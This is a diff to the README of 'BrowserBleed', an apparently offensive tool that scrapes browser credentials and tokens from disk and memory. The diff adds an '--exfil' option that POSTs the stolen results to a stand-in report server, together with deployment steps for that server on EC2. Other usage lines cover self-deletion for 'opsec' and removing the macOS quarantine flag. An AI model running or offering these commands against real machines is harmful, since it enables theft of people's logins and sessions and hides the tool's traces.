@@ -153,28 +153,95 @@ Both versions write two files to the same directory as the binary:
 ### Windows
 
 ```
-BrowserBleed.exe                    # all browsers, disk + memory
-BrowserBleed.exe --browser chrome   # target one browser
-BrowserBleed.exe --memory-only      # skip disk extraction
-BrowserBleed.exe --disk-only        # skip memory scraping
-BrowserBleed.exe --verify           # verify tokens (makes outbound requests)
-BrowserBleed.exe --max-hits 500     # raise memory hit cap per browser (default: 300)
-BrowserBleed.exe --out results.txt  # custom output path
-BrowserBleed.exe --self-delete      # delete exe after run (opsec)
+BrowserBleed.exe                                      # all browsers, disk + memory
+BrowserBleed.exe --browser chrome                     # target one browser
+BrowserBleed.exe --memory-only                        # skip disk extraction
+BrowserBleed.exe --disk-only                          # skip memory scraping
+BrowserBleed.exe --verify                             # verify tokens (makes outbound requests)
+BrowserBleed.exe --max-hits 500                       # raise memory hit cap per browser (default: 300)
+BrowserBleed.exe --out results.txt                    # custom output path
+BrowserBleed.exe --self-delete                        # delete exe after run (opsec)
+BrowserBleed.exe --exfil https://your-server.com \   # POST results to report server
+                 --exfil-key YOUR_API_KEY
 ```
 
 ### macOS
 
 ```bash
-sudo ./BrowserBleed_mac                        # all browsers, disk + memory
-sudo ./BrowserBleed_mac --browser chrome       # target one browser
-sudo ./BrowserBleed_mac --memory-only          # skip disk extraction
-sudo ./BrowserBleed_mac --disk-only            # skip memory scraping
-sudo ./BrowserBleed_mac --verify               # verify tokens (makes outbound requests)
-sudo ./BrowserBleed_mac --max-hits 500         # raise memory hit cap per browser (default: 300)
-sudo ./BrowserBleed_mac --out /tmp/results.txt # custom output path
-sudo ./BrowserBleed_mac --self-delete          # delete binary after run (opsec)
+sudo ./BrowserBleed_mac                                          # all browsers, disk + memory
+sudo ./BrowserBleed_mac --browser chrome                         # target one browser
+sudo ./BrowserBleed_mac --memory-only                            # skip disk extraction
+sudo ./BrowserBleed_mac --disk-only                              # skip memory scraping
+sudo ./BrowserBleed_mac --verify                                 # verify tokens (makes outbound requests)
+sudo ./BrowserBleed_mac --max-hits 500                           # raise memory hit cap per browser (default: 300)
+sudo ./BrowserBleed_mac --out /tmp/results.txt                   # custom output path
+sudo ./BrowserBleed_mac --self-delete                            # delete binary after run (opsec)
+sudo ./BrowserBleed_mac --exfil https://your-server.com \        # POST results to report server
+                        --exfil-key YOUR_API_KEY
 ```
+
+---
+
+## Report Server
+
+BrowserBleed includes an optional self-hosted report server (`server/`) for receiving and viewing results from remote engagements. When `--exfil` is used, BrowserBleed POSTs the `.txt` and `.csv` to the server after the run; the report URL is appended to `bb_results.txt`.
+
+### Security model
+
+The server is designed to handle highly sensitive data. Three layers of protection are applied:
+
+| Layer | Mechanism |
+|-------|-----------|
+| **Encryption at rest** | Every report is encrypted with AES-256-GCM before touching disk. A separate `ENCRYPTION_KEY` (distinct from the API key) is used. `.enc` files only — no plaintext ever written. `meta.json` (hostname, timestamps, hit count — no credential values) is stored unencrypted for index building. |
+| **Auth** | Browser access via `POST /login` form → HttpOnly session cookie (no query params, never in logs). Programmatic upload via `Authorization: Bearer` header only. `/login` has `access_log off` in nginx so the key is never logged. |
+| **Auto-expiry** | Reports are deleted after a configurable TTL (default 24h). A background goroutine runs every 15 minutes. Expiry time is shown in the report view. |
+
+> **Honest limitation:** If the EC2 is fully compromised with root access, an attacker can read `ENCRYPTION_KEY` from `/opt/bb-reports/.env` and decrypt stored reports. The TTL limits the blast radius to whatever was uploaded in the last day.
+
+### Deploying the report server
+
+Prerequisites: AWS CLI authenticated, Route 53 hosted zone for your domain, Go 1.22+.
+
+```bash
+# 1. Configure your deployment
+cp deploy/config.example deploy/config
+# Edit deploy/config with your domain, email, region, etc.
+
+# 2. Spin up the EC2 instance
+bash deploy/provision.sh
+
+# 3. Wait ~60s, then configure nginx + TLS
+bash deploy/setup-server.sh
+
+# 4. Build and deploy the server binary (prompts for secrets on first run)
+bash deploy/deploy-binary.sh
+```
+
+`deploy-binary.sh` prompts for four secrets on first deploy and writes them to `/opt/bb-reports/.env` (mode 600) on the server:
+
+| Variable | Purpose |
+|----------|---------|
+| `API_KEY` | Shared between BrowserBleed `--exfil-key` and the browser login form |
+| `ENCRYPTION_KEY` | 64-char hex AES-256 key — generate with `openssl rand -hex 32` |
+| `BASE_URL` | Public URL of the server (e.g. `https://reports.yourdomain.com`) |
+| `REPORT_TTL` | How long reports are kept (e.g. `24h`, `72h`) |
+
+To update the binary after code changes:
+```bash
+bash deploy/deploy-binary.sh   # rebuilds, uploads, restarts service
+```
+
+### Using `--exfil` in an engagement
+
+```bash
+# Windows
+BrowserBleed.exe --exfil https://reports.yourdomain.com --exfil-key YOUR_API_KEY
+
+# macOS
+sudo ./BrowserBleed_mac --exfil https://reports.yourdomain.com --exfil-key YOUR_API_KEY
+```
+
+The report URL is printed in `bb_results.txt` and accessible in the browser at `https://reports.yourdomain.com/` after logging in with the API key.
 
 ---
 
@@ -199,6 +266,17 @@ chmod +x build_mac.sh && ./build_mac.sh
 The build script strips the Gatekeeper quarantine attribute automatically. If you re-download the binary, run:
 ```bash
 xattr -dr com.apple.quarantine BrowserBleed_mac
+```
+
+### Report server
+
+```bash
+# Local dev/test
+cd server
+go run ./cmd/server -- --api-key testkey --enc-key $(openssl rand -hex 32) --data-dir /tmp/bb-data --base-url http://localhost:8080
+
+# Production (handled by deploy-binary.sh)
+cd server && GOOS=linux GOARCH=amd64 go build -ldflags "-s -w" -o ../deploy/server-linux ./cmd/server/
 ```
 
 ---
